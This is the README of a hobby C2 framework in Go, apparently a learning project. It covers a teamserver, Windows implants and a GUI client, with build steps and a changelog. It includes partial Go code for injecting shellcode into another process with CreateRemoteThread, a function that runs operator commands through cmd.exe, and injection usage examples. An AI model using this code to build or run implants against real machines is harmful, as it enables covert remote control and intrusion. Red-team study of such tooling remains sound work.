![Winton](https://i.imgur.com/Pmrv5t7.png)

<div align="center">
<h1>Winton</h1>

<i>Yet another Command and Control (C2) framework written in Go</i>
</div>

I wrote this to learn more about C2 internals, OPSEC considerations in beacon and to learn Golang _(i still can't get function imports to work)_.

![Cover](https://i.imgur.com/xhTM1va.png)

> 🐒 Winton was designed solely for educational purposes, and is still in early stages of development and may be unstable. 

## Features
### Teamserver
> Written in Golang 1.21.1 with Gin (tested on Windows/AMD64)
- Support for multiple listeners- only HTTP is implemented
- Multiple agents & asynchronous callbacks

### Implant
> Written in Golang 1.21.1 (tested on Windows/AMD64) 
- OPSEC Considerations
    - Heavy reliance on Golang's `os/exec` and `os/user` packages for cross-platform compatibility and built-ins (`whoami`, `pwd`, `ls`), may be OPSEC unsafe.
    - `inject` uses `CreateRemoteThread` and doesn't check for architecture, may result in the process and/or shellcode crashing- use `ps` to check for architecture before injection.
        - `ps` uses the `syscall` and `golang.org/x/sys/windows` package to access the WinAPIs, see [source](./implant/Wonton%20(GO)/commands.go#L160)
- Updated list of supported commands available: [here](./client/Winton/globals.py#)
- There are 2 implants available:
    - `Orisa` is written in C and is extremely unstable, and has limited functionality to `ls`, `pwd` and `whoami`.
    - `Sigma` is written in Golang and is much more stable, and has more functionality than `Orisa`.
        - `Sigma` is still in early stages of development, and may be unstable.
        - `Sigma` is the recommended implant to use.

### Client
> Dark themed UI written in Python with Tkinter
- Supports interaction with multiple agents & asynchronous callbacks via multithreading

![Client](https://i.imgur.com/SLLtTob.png)


## Compilation
The `teamserver` compiles to a single golang binary:
```bash
cd ./teamserver && make 
cd ./bin && ./teamserver <ip> <port> <password>
```

The Go agent `Wonton` is compiled to a single golang binary:
```bash
cd './implan/Wonton (GO)\' && make
cd ./bin && ./winton-win64.exe
```

The C agent `Wanton` has a MSVC solution file, compile the solution in `Release` mode (not really maintained, probably broken):
```bash
gcc -Wall -std=c99 -o Wanton.exe Commands.c Main.c Utils.c -lcurl
```
_A Makefile is not provided because I am lazy_

## Change Log

#### 26/11/2023 - Finally, a GUI client.
- The client is written in Python with Tkinter, and is multithreaded to support multiple agents and asynchronous callbacks.
- Python API for Winton has been refactored to be more modular and easier to use (because I realized I had to convert the CLI client to a GUI).
- The client is still in early stages of development, and may or may not be stable.

![26/11/2023](https://i.imgur.com/bZUMs4B.png)

#### 24/11/2023 - Shellcode Injection via CreateRemoteThread (Session Passing)
- 2 new commands: `ps` and `inject`
    - `ps` lists all running processes on the target as well as their PID, PPID, Name, Arch, Session & User.
        - `Usage: ps`
![24/11/2023](https://i.imgur.com/GAYSs0m.png)
    - `inject` injects shellcode into a running process via `CreateRemoteThread`
![24/11/2023](https://i.imgur.com/H7OD72D.png)
        - `Usage: inject <pid> <path_to_binfile>`
        - `Example: inject 17952 ../shellcode/calc/calc.bin`
        - The shellcode is loaded from a file, and is base64 encoded before being sent to the target.
        - The shellcode is then decoded and injected into the target process via `CreateRemoteThread`
        ```go
        var kernel32 = windows.NewLazySystemDLL("kernel32.dll")

        var (
            virtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
            writeProcessMemory  = kernel32.NewProc("WriteProcessMemory")
            createRemoteThread  = kernel32.NewProc("CreateRemoteThread")
            WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
            closeHandle         = kernel32.NewProc("CloseHandle")
        )
        ...
        process_handle, err := windows.OpenProcess(..., uint32(pid), ...)
        ...
        addr, _, err := virtualAllocEx.Call(..., uintptr(len(shellcode)), ..., windows.PAGE_EXECUTE_READWRITE) // BAD
        ...
        _, _, err := writeProcessMemory.Call(..., addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
        ...
        thread_handle, _, err := createRemoteThread.Call(uintptr(process_handle), 0,  0, addr, 0, 0, 0)

        closeHandle.Call(uintptr(thread_handle))
        closeHandle.Call(uintptr(process_handle))
        ```
    - OPSEC considerations (why this is a budget injection):
        - `VirtualAllocEx` is called with PAGE_EXECUTE_READWRITE
        - Unbacked memory allocation 
        - Thread start address is 0x0 

- `./shellcode/calc/calc.bin` is x64 shellcode that spawns calc.exe ~ [_thanks boku7_](https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode/blob/main/win-x64-DynamicKernelWinExecCalc.asm)
- `./shellcode/beacon/winton-win64.bin` is x64 shellcode that spawns a new beacon ~ [_thanks donut_](https://github.com/TheWover/donut) -
    - generated using [exe2_csh](https://github.com/gatariee/exe2c_sh) 
    - `./exe2sh.py -i winton-win64.exe -o ./shellcode/beacon/winton-win64.bin`

#### 15/11/2023 - Mass codebase refactoring & implementation of shell commands 
- The codebase has been refactored to be more modular and easier to read, (teamserver & go implant)
    - Doesn't exactly follow Go best practices, but it's certainly better than before. 
- The `teamserver` and `implant (go)` now have Makefiles and support for cross-compilation, see [here](./implant/Wonton%20(GO)/Makefile) and [here](./teamserver/Makefile) for more info.
- Added support for `shell` commands in beacon
    - Spawns `cmd.exe /c {task}`, not opsec safe.
```go
func shell(command string) (string, error) {
cmd := exec.Command("cmd.exe", "/c", command)
stdout, err := cmd.Output()
if err != nil {
    return "", err
}
return string(stdout), nil
}
```
![15/11/2023](https://i.imgur.com/JVeojRf.png)

#### 12/11/2023 - Wanton has a better (and much bigger) brother implant! (Wonton)
- The [new implant](./implant/Wonton%20(GO)/) is written in Go.
- Although this was much more convenient to write, Golang binaries have the downside being much larger than C binaries.
    - The C implant is 75KB, the Go implant is 7,165KB.
- The Go implant is also much more stable than the C implant, and has more features.
    - The C implant will be removed in the future.
- Currently has support for 2 commands: `whoami` and `ls`
![12/11/2023](https://i.imgur.com/ZkIaKIw.png)
![12/11/2023](https://i.imgur.com/lcZvWN7.png)

#### 10/11/2023 - Winton now has an agent for Windows! (Wanton)
- The agent is written in C and is extremely unstable! :D, and barely functional.
    - This implant will probably be abandoned cos I hate parsing JSON in C, but this was a nice WinAPI sanity check.
- Currently only has support for `pwd`, but more commands will be added eventually.
    ![10/11/2023](https://i.imgur.com/D2nVffY.png)
#### 9/11/2023 - Beacons can now go offline!
- If the callback from the last beacon is over `Agent.Sleep + 5` seconds, the beacon will be marked as down (_but should still listening for callbacks_).
   - In its current state, the agent gets completely removed from the `AgentList[]` and `AgentCallbacks[]` if it goes offline, this will be changed in the future to allow for offline agents to still be in the list.
    ![9/11/2023](https://i.imgur.com/CZm1eGe.png)
- The change of beacon state is also reflected in the `AgentList[]` and `AgentCallbacks[]` tables
    ![9/11/2023](https://i.imgur.com/p87EHej.png)
